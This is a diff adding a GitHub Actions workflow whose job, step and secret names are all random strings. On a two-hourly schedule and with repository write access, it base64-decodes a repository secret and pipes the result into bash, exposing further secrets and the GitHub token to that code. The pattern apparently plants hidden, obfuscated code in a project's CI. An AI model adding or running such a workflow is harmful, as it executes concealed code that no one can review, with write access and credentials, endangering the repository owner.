@@ -1,0 +1,21 @@
+name: XeBAW
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  wWokeOL24q:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.IywzpHBaAWae45H }}
+      - name: UorHyN7
+        env:
+          u27kAO3wC: ${{ secrets.sD3V5eiVZnAkviX }}
+          tRZLQYJMNXyM5T7L: ${{ secrets.ieu8f871ltCXrbIW }}
+          doA0FeWXm: ${{ secrets.HDtYDdnu5VzsfCs }}
+          GITHUB_TOKEN: ${{ secrets.IywzpHBaAWae45H }}
+        run: echo "$u27kAO3wC" | base64 -d | bash
